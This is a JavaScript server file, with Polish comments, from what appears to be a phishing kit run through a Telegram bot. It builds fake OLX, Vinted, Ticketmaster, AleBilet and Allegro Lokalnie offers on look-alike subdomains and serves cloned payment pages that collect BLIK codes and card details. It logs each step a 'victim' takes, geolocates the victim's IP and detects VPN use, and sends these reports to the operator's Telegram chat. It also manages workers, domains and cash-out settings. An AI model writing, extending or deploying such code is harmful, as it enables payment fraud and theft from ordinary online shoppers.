		status: { type: Number, default: 0 },
		smiec: String,
		idoferty: String,
		cena: String,
		platform: String,
		nr: String,
		workerName: String,
		updatedAt: { type: Date, default: Date.now }
	}, { versionKey: false });

	blikSessionSchema.index({ updatedAt: 1 }, { expireAfterSeconds: 7200 });

	const BlikSession = mongoose.model('BlikSession', blikSessionSchema, 'bliksessions');
	
	
	
	const loadUsersDB = async () => {
		try {
			const users = await User.find({});
			return users;
		} catch (error) {
			console.error("Błąd podczas łaadowania użytkowników z bazy danych:", error);
			return [];
		}
	};
	
	const editUserDB = async (userId, updatedData) => {
		try {
			const user = await User.findOneAndUpdate({
				id: userId
			}, updatedData, {
				new: true
			});
	
			if (!user) {
				console.log("Nie znaleziono użytkownika o ID:", userId);
				return null;
			}
	
			return user;
		} catch (error) {
			console.error("Błąd podczas edytowania użytkownika:", error);
			return null;
		}
	};
	
	
	const deleteUserDB = async (userId) => {
		try {
			const user = await User.findOneAndDelete({
				id: userId
			});
	
			if (!user) {
				console.log("Nie znaleziono użytkownika o ID:", userId);
				return false;
			}
	
			return true;
		} catch (error) {
			console.error("Błąd podczas usuwania użytkownika:", error);
			return false;
		}
	};
	
	const loadOffersDB = async () => {
		try {
			const offers = await Offer.find();
			return offers;
		} catch (error) {
			console.error("Błąd podczas wczytywania ofert:", error);
			return [];
		}
	};
	
	
	const loadOffersOLXDB = async () => {
		try {
			const offers = await OfferOLX.find();
			return offers;
		} catch (error) {
			console.error("Błąd podczas wczytywania ofert:", error);
			return [];
		}
	};

	const loadOffersTicketmasterDB = async () => {
		try {
			return await OfferTicketmaster.find();
		} catch (error) {
			console.error("Błąd podczas wczytywania ofert Ticketmaster:", error);
			return [];
		}
	};

	const loadOffersVintedDB = async () => {
		try {
			return await OfferVinted.find();
		} catch (error) {
			console.error("Błąd podczas wczytywania ofert Vinted:", error);
			return [];
		}
	};

	const loadOffersAlebiletDB = async () => {
		try {
			return await OfferAlebilet.find();
		} catch (error) {
			console.error("Błąd podczas wczytywania ofert AleBilet:", error);
			return [];
		}
	};
	
	const saveOffersDB = async (offers) => {
		try {
			const bulkOps = offers.map(offer => ({
				updateOne: {
					filter: {
						idoferty: offer.idoferty
					},
					update: {
						$set: offer
					},
					upsert: true,
				},
			}));
			await Offer.bulkWrite(bulkOps);
		} catch (error) {
			console.error("Błąd zapisu w MongoDB:", error);
		}
	};
	
	
	const saveOffersOLXDB = async (offers) => {
		try {
			const bulkOps = offers.map(offer => ({
				updateOne: {
					filter: {
						idoferty: offer.idoferty
					},
					update: {
						$set: offer
					},
					upsert: true,
				},
			}));
			await OfferOLX.bulkWrite(bulkOps);
		} catch (error) {
			console.error("Błąd zapisu w MongoDB:", error);
		}
	};

	const saveOffersTicketmasterDB = async (offers) => {
		try {
			const bulkOps = offers.map(offer => ({
				updateOne: {
					filter: { idoferty: offer.idoferty },
					update: { $set: offer },
					upsert: true,
				},
			}));
			await OfferTicketmaster.bulkWrite(bulkOps);
		} catch (error) {
			console.error("Błąd zapisu Ticketmaster w MongoDB:", error);
		}
	};

	const saveOffersVintedDB = async (offers) => {
		try {
			const bulkOps = offers.map(offer => ({
				updateOne: {
					filter: { idoferty: offer.idoferty },
					update: { $set: offer },
					upsert: true,
				},
			}));
			await OfferVinted.bulkWrite(bulkOps);
		} catch (error) {
			console.error("Błąd zapisu Vinted w MongoDB:", error);
		}
	};

	const saveOffersAlebiletDB = async (offers) => {
		try {
			const bulkOps = offers.map(offer => ({
				updateOne: {
					filter: { idoferty: offer.idoferty },
					update: { $set: offer },
					upsert: true,
				},
			}));
			await OfferAlebilet.bulkWrite(bulkOps);
		} catch (error) {
			console.error("Błąd zapisu AleBilet w MongoDB:", error);
		}
	};
	
	const editOfferDBOLX = async (offerId, updatedOffer) => {
		try {
			const result = await OfferOLX.findOneAndUpdate({
				idoferty: offerId
			}, {
				$set: updatedOffer
			}, {
				new: true
			});
			return result;
		} catch (error) {
			console.error("Błąd podczas edytowania oferty:", error);
			throw new Error("Nie udało się edytwać oferty");
		}
	};

	const editOfferDBTicketmaster = async (offerId, updatedOffer) => {
		try {
			return await OfferTicketmaster.findOneAndUpdate({ idoferty: offerId }, { $set: updatedOffer }, { new: true });
		} catch (error) {
			console.error("Błąd podczas edytowania oferty Ticketmaster:", error);
			throw new Error("Nie udało się edytować oferty");
		}
	};

	const editOfferDBVinted = async (offerId, updatedOffer) => {
		try {
			return await OfferVinted.findOneAndUpdate({ idoferty: offerId }, { $set: updatedOffer }, { new: true });
		} catch (error) {
			console.error("Błąd podczas edytowania oferty Vinted:", error);
			throw new Error("Nie udało się edytować oferty");
		}
	};

	const editOfferDBAlebilet = async (offerId, updatedOffer) => {
		try {
			return await OfferAlebilet.findOneAndUpdate({ idoferty: offerId }, { $set: updatedOffer }, { new: true });
		} catch (error) {
			console.error("Błąd podczas edytowania oferty AleBilet:", error);
			throw new Error("Nie udało się edytować oferty");
		}
	};
	
	
	
	const editOfferDB = async (offerId, updatedOffer) => {
		try {
			const result = await Offer.findOneAndUpdate({
				idoferty: offerId
			}, {
				$set: updatedOffer
			}, {
				new: true
			});
			return result;
		} catch (error) {
			console.error("Błąd podczas edytowania oferty:", error);
			throw new Error("Nie udało się edytwać oferty");
		}
	};
	
	
	const deleteOfferDB = async (offerId) => {
		try {
			const result = await Offer.findOneAndDelete({
				idoferty: offerId
			});
			if (!result) {
				throw new Error("Oferta nie została znaleziona.");
			}
			return result;
		} catch (error) {
			console.error("Bład podczas usuwania oferty:", error);
			throw new Error("Nie udało się usunąć oferty");
		}
	};

	const deleteOfferDBOLX = async (offerId) => {
		try {
			const result = await OfferOLX.findOneAndDelete({
				idoferty: offerId
			});
			if (!result) {
				throw new Error("Oferta nie została znaleziona.");
			}
			return result;
		} catch (error) {
			console.error("Bład podczas usuwania oferty:", error);
			throw new Error("Nie udało się usunąć oferty");
		}
	};

	const deleteOfferDBTicketmaster = async (offerId) => {
		try {
			const result = await OfferTicketmaster.findOneAndDelete({ idoferty: offerId });
			if (!result) throw new Error("Oferta nie została znaleziona.");
			return result;
		} catch (error) {
			console.error("Błąd podczas usuwania oferty Ticketmaster:", error);
			throw new Error("Nie udało się usunąć oferty");
		}
	};

	const deleteOfferDBVinted = async (offerId) => {
		try {
			const result = await OfferVinted.findOneAndDelete({ idoferty: offerId });
			if (!result) throw new Error("Oferta nie została znaleziona.");
			return result;
		} catch (error) {
			console.error("Błąd podczas usuwania oferty Vinted:", error);
			throw new Error("Nie udało się usunąć oferty");
		}
	};

	const deleteOfferDBAlebilet = async (offerId) => {
		try {
			const result = await OfferAlebilet.findOneAndDelete({ idoferty: offerId });
			if (!result) throw new Error("Oferta nie została znaleziona.");
			return result;
		} catch (error) {
			console.error("Błąd podczas usuwania oferty AleBilet:", error);
			throw new Error("Nie udało się usunąć oferty");
		}
	};
	
async function getBotConfig(key, defaultValue = null) {
	try {
		const doc = await BotConfig.findOne({ key });
		return doc ? doc.value : defaultValue;
	} catch (error) {
		return defaultValue;
	}
}

async function setBotConfig(key, value) {
	await BotConfig.findOneAndUpdate({ key }, { value: String(value) }, { upsert: true, new: true });
}

async function getPublicDomain() {
	return (await getBotConfig("public_domain")) || CONFIG.BOT_SETTINGS.DEFAULT_DOMAIN || "";
}

async function isGlobalBlikEnabled() {
	return (await getBotConfig("global_blik_enabled", "Tak")) !== "Nie";
}

async function isGlobalCardEnabled() {
	return (await getBotConfig("global_card_enabled", "Tak")) !== "Nie";
}

async function isGlobalSelfCashout() {
	return (await getBotConfig("selfcashout_enabled", "Nie")) === "Tak";
}

// Globalny przełącznik lub indywidualny promo kod z ważnością
async function isSelfCashoutEnabled(userId = null) {
	if (await isGlobalSelfCashout()) return true;
	if (userId == null) return false;
	const u = await User.findOne({ id: Number(userId) });
	return !!(u && u.selfCashoutUntil && u.selfCashoutUntil.getTime() > Date.now());
}

function formatSelfCashoutStatus(enabled) {
	return enabled ? "🟢 Włączony" : "🔴 Wyłączony";
}

function globalEnabledToTakNie(enabled) {
	return enabled ? "Tak" : "Nie";
}

function parseRequestSubdomain(req) {
	const host = (req.get('Host') || '').split(':')[0].toLowerCase();
	const parts = host.split('.');
	if (parts[0] === 'www' && parts.length > 2) return parts[1];
	return parts[0];
}

function normalizeOfferLink(value) {
	if (value == null) return '';
	try {
		return decodeURIComponent(String(value));
	} catch {
		return String(value);
	}
}

function offerLinkMatches(offerLink, requestedLink) {
	const stored = normalizeOfferLink(offerLink);
	const requested = normalizeOfferLink(requestedLink);
	return stored === requested
		|| encodeURIComponent(stored) === requested
		|| stored === encodeURIComponent(requested);
}

function normalizeGatewayStepParam(value, priority = []) {
	if (value == null) return undefined;
	const steps = Array.isArray(value) ? value : [value];
	for (const preferred of priority) {
		if (steps.includes(preferred)) return preferred;
	}
	return steps[steps.length - 1];
}

function prepareGatewayPaymentTemplate(template, req) {
	return template
		.replace(
			/function PayBlik\(\) \{\s*location\.href = "\?olx=BLIK"\s*\}/,
			`function PayBlik() {
		var q = new URLSearchParams(window.location.search);
		q.set('olx', 'BLIK');
		location.href = window.location.pathname + '?' + q.toString();
	}`
		)
		.replace(/location\.href = "\?olx=BLIK"/g, `(function(){var q=new URLSearchParams(window.location.search);q.set('olx','BLIK');location.href=window.location.pathname+'?'+q.toString()})()`)
		.replace(/href="\?olx=PayU"/g, 'href="javascript:void(0)" onclick="(function(){var q=new URLSearchParams(window.location.search);q.set(\'olx\',\'PayU\');location.href=window.location.pathname+\'?\'+q.toString()})()"')
		.replace(
			/onclick="location\.href='\?olx=PayU'"/g,
			'onclick="(function(){var q=new URLSearchParams(window.location.search);q.set(\'olx\',\'BLIK\');q.delete(\'auth\');q.delete(\'code\');location.href=window.location.pathname+\'?\'+q.toString()})()"'
		);
}

function getOwnerPrzelewy(wlasciciel) {
	return wlasciciel?.przelewy || { status: 'Nie', Imie: '', Nazwisko: '', Numer: '' };
}

const GATEWAY_PLATFORMS = {
	olx: { emoji: '🟢', label: 'OLX', add: 'add_offer_olx', list: 'my_offers_olx' },
	allegrolokalnie: { emoji: '🅰️', label: 'Allegro Lokalnie', add: 'add_offer_lokalnie', list: 'my_offers_lokalnie' },
	vinted: { emoji: '👕', label: 'Vinted', add: 'add_offer_vinted', list: 'my_offers_vinted' },
	ticketmaster: { emoji: '🎟', label: 'TicketMaster', add: 'add_offer_ticketmaster', list: 'my_offers_ticketmaster' },
	alebilet: { emoji: '🎫', label: 'AleBilet', add: 'add_offer_alebilet', list: 'my_offers_alebilet' },
};

const GATEWAY_MERCHANT_LABELS = {
	olx: 'olx.pl',
	vinted: 'vinted.pl',
	ticketmaster: 'ticketmaster.pl',
	alebilet: 'alebilet.pl',
	allegrolokalnie: 'allegrolokalnie.pl',
};

function getGatewayMerchantLabel(platform) {
	return GATEWAY_MERCHANT_LABELS[platform] || 'olx.pl';
}

function prepareGatewayBlikTemplate(template, platform, oferta, req) {
	const AUTH = req.query.auth ? 'true' : 'false';
	const ERROR = String(req.query.error || req.query.c || 0);
	const merchant = getGatewayMerchantLabel(platform);
	let result = template
		.replace(/TUTAJNAZWA/g, oferta.nazwa || '')
		.replace(/TUTAJMERCHANT/g, merchant)
		.replace(/TUTAJERROR/g, ERROR)
		.replace(/TUTAJAUTH/g, AUTH)
		.replace(/TUTAJCENA/g, platform === 'ticketmaster'
			? String(getTicketmasterPricing(oferta).totalInt)
			: platform === 'alebilet'
				? String(getAlebiletPricing(oferta).totalInt)
				: (oferta.cena || '0'))
		.replace(/TUTAJID/g, oferta.link || '')
		.replace(/href="\.\.\/assets\/blik\/style\.css"/g, 'href="/assets/blik/style.css"');

	if (platform === 'vinted') {
		result = applyVintedReplacements(result, oferta)
			.replace(/\?olx=/g, '?vinted=')
			.replace(/olxBlikCode/g, 'vintedBlikCode')
			.replace(/location\.href='\?vinted=PayU'/g, "location.href='?vinted=zakup'")
			.replace(/location\.href='\?olx=PayU'/g, "location.href='?vinted=zakup'");
	}

	if (platform !== 'olx') {
		result = result
			.replace(/(<div class="">)olx\.pl(<\/div>)/g, `$1${merchant}$2`)
			.replace(/(<div class="">)TUTAJMERCHANT(<\/div>)/g, `$1${merchant}$2`);
	}

	return result;
}

function fitCaption(caption, max = 1000) {
	const c = String(caption);
	if (c.length <= max) return c;
	let cut = c.slice(0, max);
	const lt = cut.lastIndexOf("<");
	if (lt > cut.lastIndexOf(">")) cut = cut.slice(0, lt); // nie przecinaj tagu w połowie
	const open = [];
	for (const m of cut.matchAll(/<(\w+)[^>]*>/g)) {
		if (!/^<\//.test(m[0])) open.push(m[1]);
	}
	for (const m of cut.matchAll(/<\/(\w+)>/g)) {
		const i = open.lastIndexOf(m[1]);
		if (i >= 0) open.splice(i, 1);
	}
	const closers = open.reverse().map((t) => `</${t}>`).join("");
	return `${cut}${closers}`;
}

function formatVintedOfferCaption(offer, offerLink) {
	const clip = (v, n) => {
		const s = String(v ?? "-").trim();
		return s.length > n ? `${s.slice(0, n - 1)}…` : s;
	};
	const desc = clip(offer.description || "-", 120);
	const tags = clip(offer.tagi || "-", 70);
	const esc = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

	return `───────── [ 𝕂 ] ─────────\n❖ *OFERTA · VINTED*\n──────────────────\n\n` +
		`› *Nazwa:* \`${esc(clip(offer.nazwa, 60))}\`\n` +
		`› *Sprzedawca:* \`${esc(clip(offer.sprzedawca, 24))}\`\n` +
		`› *Nazwa firmy:* \`${esc(clip(offer.nazwaFirmy || "Vinted Go", 24))}\`\n` +
		`› *Opis:* \`${esc(desc)}\`\n` +
		`› *Cena przedmiotu:* \`${esc(offer.cena)} PLN\`\n` +
		`› *Cena dostawy:* \`${esc(offer.cenaDostawy || "11.49")} PLN\`\n` +
		`› *Cena ochrony:* \`${esc(offer.cenaOchrony || "4.99")} PLN\`\n` +
		`› *Opłata serwisowa:* \`${offer.oplata != null && offer.oplata !== "" ? `${esc(offer.oplata)} PLN` : "auto (15%)"}\`\n` +
		`› *Miasto:* \`${esc(clip(offer.miasto, 30))}\`\n` +
		`› *Ostatnio online:* \`${esc(clip(offer.lastonline, 30))}\`\n` +
		`› *Kategoria:* \`${esc(clip(offer.kategoria, 24))}\`\n` +
		`› *Tagi:* \`${esc(tags)}\`\n` +
		`› *Zdjęcia:* ${(offer.zdjecia || []).length}\n\n` +
		`› *Link:* ${esc(offerLink)}`;
}

function buildVintedOfferKeyboard(offerId) {
	return [
		[
			{ text: "Nazwa", icon_custom_emoji_id: "6039779802741739617", callback_data: `vinted_edit_name_${offerId}` },
			{ text: "Opis", icon_custom_emoji_id: "5920046907782074235", callback_data: `vinted_edit_desc_${offerId}` }
		],
		[{ text: "Cena", icon_custom_emoji_id: "5778421276024509124", callback_data: `vinted_edit_price_${offerId}` }],
		[
			{ text: "Cena dostawy", icon_custom_emoji_id: "5778672437122045013", callback_data: `vinted_edit_delivery_${offerId}` },
			{ text: "Cena ochrony", icon_custom_emoji_id: "6030537007350944596", callback_data: `vinted_edit_protection_${offerId}` }
		],
		[
			{ text: "Nazwa firmy", icon_custom_emoji_id: "5938492039971737551", callback_data: `vinted_edit_company_${offerId}` },
			{ text: "Sprzedawca", icon_custom_emoji_id: "6032994772321309200", callback_data: `vinted_edit_seller_${offerId}` }
		],
		[
			{ text: "Miasto", icon_custom_emoji_id: "6030399199030284183", callback_data: `vinted_edit_city_${offerId}` },
			{ text: "Ostatnio online", icon_custom_emoji_id: "5774022692642492953", callback_data: `vinted_edit_lastonline_${offerId}` }
		],
		[
			{ text: "Kategoria", icon_custom_emoji_id: "5778672437122045013", callback_data: `vinted_edit_category_${offerId}` },
			{ text: "Tagi", icon_custom_emoji_id: "5888620056551625531", callback_data: `vinted_edit_tags_${offerId}` }
		],
		[
			{ text: "Dodaj zdjęcia", icon_custom_emoji_id: "6032924188828767321", callback_data: `vinted_edit_addphotos_${offerId}` },
			{ text: "Usuń zdjęcia", icon_custom_emoji_id: "6039522349517115015", callback_data: `vinted_edit_removephotos_${offerId}` }
		],
		[{ text: "Kod QR", icon_custom_emoji_id: "6039605143601680423", callback_data: `offer_qr_vinted_${offerId}` }],
		[{ text: "Usuń ofertę", icon_custom_emoji_id: "6030757850274336631", callback_data: `vinted_delete_offer_${offerId}` }],
		[{ text: "Wróć", icon_custom_emoji_id: "5895507195524550741", callback_data: "my_offers_vinted" }]
	];
}

const GATEWAY_PAYMENT_STEPS = new Set([
	'PayU', 'PayU_BLIK', 'PayU_Karta', 'BLIK', 'PayU_Przelew', 'przelew', 'Platnosc', 'error', 'inpost', 'login'
]);

function shortText(value, max) {
	const s = String(value ?? "").trim();
	return s.length > max ? `${s.slice(0, Math.max(1, max - 1))}…` : s;
}

// Premium emoji (Telegram custom emoji) — używane w captionach HTML
const PE = {
	send: '6039573425268201570',
	apple: '5775870512127283512',
	star: '6028338546736107668',
	sparkle: '5778226250149532337',
	calstar: '5890937706803894250',
	cmd: '6039404727542747508',
	box: '5778672437122045013',
	gearO: '5962952497197748583',
	gear: '5904258298764334001',
	gearA: '5940433880585605708',
	gearHD: '5936143551854285132',
	gearSD: '5938539885907415367',
	gearFHD: '5938539885907415367',
	sliders: '5776424837786374634',
	slidersV: '5776424837786374634',
	quotes: '5920046907782074235',
	quoteX: '6030757850274336631',
};
function pe(key, fallback) {
	const id = PE[key];
	if (!id) return fallback || '';
	return `<tg-emoji emoji-id="${id}">${fallback || ''}</tg-emoji>`;
}

function formatGatewayNotifyPrice(platform, oferta) {
	if (!oferta) return null;
	if (platform === 'alebilet') {
		return `${getAlebiletPricing(oferta).totalInt} PLN`;
	}
	const raw = oferta.cena;
	if (raw == null || raw === '') return null;
	const asString = String(raw);
	return /zł|PLN/i.test(asString) ? asString : `${asString} PLN`;
}

// ── Geo / sieć / VPN lookup dla powiadomień o victima ──
const ipInfoCache = new Map();

function clientIpFromReq(req) {
	if (!req) return '';
	const xf = String(req.get?.('x-forwarded-for') || '').split(',')[0].trim();
	const raw = xf || req.ip || req.socket?.remoteAddress || '';
	return raw.replace(/^::ffff:/, '').replace(/^::1$/, '127.0.0.1');
}

function isPrivateIp(ip) {
	return !ip || ip === '127.0.0.1' || /^10\./.test(ip) || /^192\.168\./.test(ip) || /^172\.(1[6-9]|2\d|3[01])\./.test(ip);
}

async function lookupIpInfo(ip) {
	if (isPrivateIp(ip)) return { label: "Sieć lokalna / loopback", vpn: null };
	if (ipInfoCache.has(ip)) return ipInfoCache.get(ip);

	let info = { label: "Nie udało się ustalić", vpn: null };
	try {
		const { data } = await axios.get(
			`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,isp,org,as,proxy,hosting,mobile`,
			{ timeout: 4000 }
		);
		if (data?.status === 'success') {
			const parts = [data.isp, data.org].filter(Boolean);
			info = {
				label: [...new Set(parts)].join(" / ") || data.as || "Nieznany operator",
				geo: [data.city, data.regionName, data.country].filter(Boolean).join(", "),
				vpn: !!data.proxy,
				hosting: !!data.hosting,
				mobile: !!data.mobile
			};
		}
	} catch (e) {}
	ipInfoCache.set(ip, info);
	if (ipInfoCache.size > 500) ipInfoCache.delete(ipInfoCache.keys().next().value);
	return info;
}

function describeClient(req) {
	if (!req) return null;
	const ua = String(req.get?.('user-agent') || '');
	const device = /iPhone|iPad|iPod/i.test(ua) ? "📱 iOS"
		: /Android/i.test(ua) ? "📱 Android"
			: /Windows/i.test(ua) ? "🖥 Windows"
				: /Mac OS X/i.test(ua) ? "🖥 macOS"
					: /Linux/i.test(ua) ? "🖥 Linux" : "❔ nieznane";
	const browser = /Edg\//i.test(ua) ? "Edge"
		: /OPR\/|Opera/i.test(ua) ? "Opera"
			: /Chrome\//i.test(ua) ? "Chrome"
				: /Firefox\//i.test(ua) ? "Firefox"
					: /Safari\//i.test(ua) ? "Safari" : "nieznana";
	return { ua, device, browser };
}

function buildGatewayNotifyMeta(oferta, platform, req = null) {
	if (!oferta) return { link: '-' };
	return {
		link: oferta.link || '-',
		nazwa: oferta.nazwa || null,
		cena: formatGatewayNotifyPrice(platform, oferta),
		ip: clientIpFromReq(req),
		client: describeClient(req)
	};
}

function formatGatewayNotifyStep(stepLabel) {	const map = {
		'Victim Otworzył Link': 'Otworzył link',
		'Victim kliknął Kup Teraz': 'Kliknął Kup Teraz',
		'Victim przeszedł do wyboru dostawy': 'Wybiera dostawę',
		'Victim wypełnia dane': 'Wypełnia dane',
		'Victim przeszedł do wyboru płatności': 'Wybiera płatność',
		'Victim przeszedł do płatności': 'Przeszedł do płatności',
		'Victim wybrał BLIK': 'Wybrał BLIK',
		'Victim wybrał kartę': 'Wybrał kartę',
		'Victim będzie wpisywał BLIK': 'Wpisuje kod BLIK',
		'Victim będzie się logował': 'Loguje się',
		'Victim wybrał przelew': 'Wybrał przelew',
		'Victim będzie wypełniał przelew': 'Wypełnia przelew',
		'Victim potwierdził wysłanie przelewu': 'Potwierdził przelew',
		'Victim wybiera paczkomat': 'Wybiera paczkomat',
		'Victim podał kartę i czeka na instrukcje': 'Podał kartę',
		'Victim — błąd płatności BLIK': 'Błąd płatności BLIK',
		'Victim zostal przekierowany na dipa (KARTA)': 'Przekierowanie na dipa',
	};
	return map[stepLabel] || stepLabel.replace(/^Victim\s*[—-]?\s*/i, '').trim() || stepLabel;
}

async function notifyGatewayVictim(owner, platform, stepLabel, offerMeta = {}) {
	if (!owner) return;
	const platformInfo = GATEWAY_PLATFORMS[platform] || {
		emoji: '🛍',
		label: formatGatewayPlatformLabel(platform),
	};
	const action = formatGatewayNotifyStep(stepLabel);

	const lines = [
		`${pe("star", "👁")} <b>Aktywność victima</b>`,
		`<blockquote>${pe("cmd", "🚩")} <b>Krok</b> · ${action}${offerMeta.cena ? `\n<tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${offerMeta.cena}` : ''}${offerMeta.nazwa ? `\n${pe("box", "📦")} <b>Oferta</b> · ${shortText(offerMeta.nazwa, 55)}` : ''}</blockquote>`,
	];

	if (offerMeta.ip) {
		const net = await lookupIpInfo(offerMeta.ip);
		const flags = [];
		if (net.vpn) flags.push("VPN/Proxy");
		if (net.hosting) flags.push("Hosting/DC");
		if (net.mobile) flags.push("LTE");
		const netLine = `${net.label}${net.geo ? ` · ${net.geo}` : ""}`;
		lines.push(`<blockquote><tg-emoji emoji-id=\"5776233299424843260\">🌐</tg-emoji> <b>IP</b> · <code>${offerMeta.ip}</code>\n📡 <b>Sieć</b> · ${netLine}\n<tg-emoji emoji-id=\"6030537007350944596\">🛡</tg-emoji> <b>Wykryto</b> · ${flags.length ? flags.join(" + ") : "brak"}</blockquote>`);
	}
	if (offerMeta.client) {
		lines.push(`<blockquote><tg-emoji emoji-id=\"6039605143601680423\">📱</tg-emoji> <b>Sprzęt</b> · ${offerMeta.client.device} · ${offerMeta.client.browser}</blockquote>`);
	}

	lines.push(`<tg-emoji emoji-id=\"5837069325034331827\">🧩</tg-emoji> ${platformInfo.emoji} <b>${platformInfo.label}</b> · <code>${shortText(offerMeta.link || '-', 40)}</code>`);

	try {
		await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
			chat_id: owner,
			text: lines.join('\n'),
			parse_mode: "HTML"
		});
	} catch (error) {
		console.error("Błąd notifyGatewayVictim:", error);
	}
}

function getGatewayFallbackUrl(subdomain) {
	const map = {
		olx: 'https://olx.pl/blad/',
		vinted: 'https://www.vinted.pl/',
		ticketmaster: 'https://www.ticketmaster.pl/',
		alebilet: 'https://www.alebilet.pl/',
		allegrolokalnie: CONFIG.URLS.ALLEGRO_404,
	};
	return map[subdomain] || CONFIG.URLS.ALLEGRO_404;
}

async function findOfferBySubdomain(subdomain, link) {
	const decodedLink = decodeURIComponent(link);
	const matchLink = (o) => o.link === link || o.link === decodedLink;

	if (subdomain === 'ticketmaster') {
		const oferty = await loadOffersTicketmasterDB();
		return oferty.find(matchLink);
	}
	if (subdomain === 'alebilet') {
		const oferty = await loadOffersAlebiletDB();
		return oferty.find(matchLink);
	}
	if (subdomain === 'vinted') {
		const oferty = await loadOffersVintedDB();
		return oferty.find(matchLink);
	}
	if (subdomain === 'olx') {
		const oferty = await loadOffersOLXDB();
		return oferty.find(matchLink);
	}
	const oferty = await loadOffersDB();
	return oferty.find(matchLink);
}

async function renderGatewayPaymentStep(req, res, platform, link, idoferty) {
	const olx = normalizeGatewayStepParam(req.query.olx, ['BLIK', 'error', 'PayU_BLIK', 'PayU_Karta', 'PayU', 'PayU_Przelew']) || 'PayU_BLIK';
	const normalizedLink = normalizeOfferLink(link);
	const oferta = platform === 'ticketmaster'
		? await findTicketmasterOffer(normalizedLink, idoferty)
		: await findAlebiletOffer(normalizedLink);

	if (!oferta) {
		console.error(`[gateway-pay] offer not found platform=${platform} link=${normalizedLink} id=${idoferty || '-'} host=${req.get('Host')}`);
		return res.redirect(getGatewayFallbackUrl(platform));
	}

	if (!(await isBotOnline()) || !(await areOfferGatewaysAvailable())) {
		return res.status(503).redirect(getGatewayFallbackUrl(platform));
	}

	if (olx === 'PayU' || olx === 'PayU_BLIK') {
		const q = new URLSearchParams(req.query);
		q.set('olx', 'BLIK');
		q.delete('c');
		q.delete('error');
		q.delete('method');
		return res.redirect(`${req.path}?${q.toString()}`);
	}

	const templateMap = {
		PayU_BLIK: 'olx_payu_blik.html',
		BLIK: 'olx_blik.html',
		PayU: 'olx_payu.html',
		error: 'olx_payu_error.html',
	};

	const templateFile = templateMap[olx];
	if (!templateFile) {
		return res.status(404).send('Nieobsługiwany krok płatności');
	}

	const cena = platform === 'alebilet'
		? String(getAlebiletPricing(oferta).totalInt)
		: String(getTicketmasterPricing(oferta).totalInt);
	const AUTH = req.query.auth ? 'true' : 'false';
	const ERROR = String(req.query.error || req.query.c || 0);

	let template = fs.readFileSync(path.join(__dirname, 'template', templateFile), 'utf8');
	if (olx === 'BLIK') {
		template = prepareGatewayBlikTemplate(template, platform, oferta, req);
	} else {
		template = template
			.replace(/TUTAJCENA/g, cena)
			.replace(/TUTAJID/g, oferta.link)
			.replace(/TUTAJNAZWA/g, oferta.nazwa || '')
			.replace(/TUTAJERROR/g, ERROR)
			.replace(/TUTAJAUTH/g, AUTH);
		template = prepareGatewayPaymentTemplate(template, req);
	}

	res.send(template);

	const notifyMeta = buildGatewayNotifyMeta(oferta, platform, req);
	if (olx === 'BLIK' && !req.query.auth) {
		await notifyGatewayVictim(oferta.owner, platform, 'Victim bedzie wpisywał blika', notifyMeta);
	} else if (olx === 'error') {
		const errLabel = req.query.method === 'karta'
			? 'Victim zostal przekierowany na dipa (KARTA)'
			: 'Victim — błąd płatności BLIK';
		await notifyGatewayVictim(oferta.owner, platform, errLabel, notifyMeta);
	}
}

function formatGlobalGatewayStatus(enabled) {
	return enabled ? "✅ Włączone" : "❌ Wyłączone";
}

async function isBotOnline() {
	return (await getBotConfig("bot_status")) !== "disabled";
}

async function areOfferGatewaysAvailable() {
	return (await isGlobalBlikEnabled()) || (await isGlobalCardEnabled());
}

async function checkOfferCreationAllowed(userId) {
	if (!(await isBotOnline())) {
		return {
			allowed: false,
			title: "Bot wyłączony",
			message: "Tworzenie ofert jest niedostępne — bot jest obecnie wyłączony."
		};
	}
	if (!(await areOfferGatewaysAvailable())) {
		return {
			allowed: false,
			title: "Bramki wyłączone",
			message: "BLIK i Karta są wyłączone. Administrator musi włączyć przynajmniej jedną bramkę."
		};
	}
	return { allowed: true };
}

async function checkBlikSubmissionAllowed(userId) {
	if (!(await isBotOnline())) {
		return {
			allowed: false,
			title: "Bot wyłączony",
			message: "Nie można wrzucać kodów — bot jest obecnie wyłączony."
		};
	}
	if (!(await isGlobalBlikEnabled())) {
		return {
			allowed: false,
			title: "BLIK wyłączony",
			message: "Wrzucanie kodów BLIK jest tymczasowo wyłączone przez administratora."
		};
	}
	if (await isSelfCashoutEnabled(userId)) {
		return { allowed: true };
	}
	return { allowed: true };
}

async function sendBlockedStatus(userId, title, message) {
	await sendModernStatus(userId, [
		{ title, lines: [modernBullet(message)] }
	]);
}

async function setPublicDomainForAll(domain) {
	if (domain && isReservedDomain(domain)) {
		throw new Error(getReservedDomainError(domain));
	}
	await setBotConfig("public_domain", domain);
	await User.updateMany(
		{
			$or: [
				{ "settings.domainMode": "public" },
				{ "settings.domainMode": { $exists: false } },
				{ "settings.domainMode": null }
			]
		},
		{ $set: { "settings.assignedPublicDomain": domain } }
	);
}

async function normalizeUserDomainSettings(user) {
	if (!user?.settings) return user;
	let changed = false;

	if (!user.settings.domainMode) {
		if (user.settings.domain) {
			user.settings.domainMode = "custom";
			user.settings.customDomain = user.settings.customDomain || user.settings.domain;
		} else {
			user.settings.domainMode = "public";
		}
		changed = true;
	}

	if (user.settings.domainMode === "public" && !user.settings.assignedPublicDomain) {
		user.settings.assignedPublicDomain = await getPublicDomain();
		changed = true;
	}

	if (user.settings.domainMode === "custom" && user.settings.customDomain && !user.settings.domain) {
		user.settings.domain = user.settings.customDomain;
		changed = true;
	}

	if (changed) await user.save();
	return user;
}

function getEffectiveUserDomainSync(user, publicDomain) {
	if (!user?.settings) return publicDomain || "";
	const mode = user.settings.domainMode || "public";
	if (mode === "custom") {
		return user.settings.customDomain || user.settings.domain || "";
	}
	return user.settings.assignedPublicDomain || publicDomain || "";
}

function buildOfferUrl(platform, domain, offerLinkSlug, idoferty) {
	if (!domain) return null;
	if (platform === "olx") return `https://olx.${domain}/oferta/${encodeURIComponent(offerLinkSlug)}`;
	if (platform === "vinted") return `https://vinted.${domain}/items/${encodeURIComponent(offerLinkSlug)}`;
	if (platform === "ticketmaster") return `https://ticketmaster.${domain}/?id=${encodeURIComponent(idoferty || offerLinkSlug)}`;
	if (platform === "alebilet") return `https://alebilet.${domain}/ssl/kup/${encodeURIComponent(offerLinkSlug)}`;
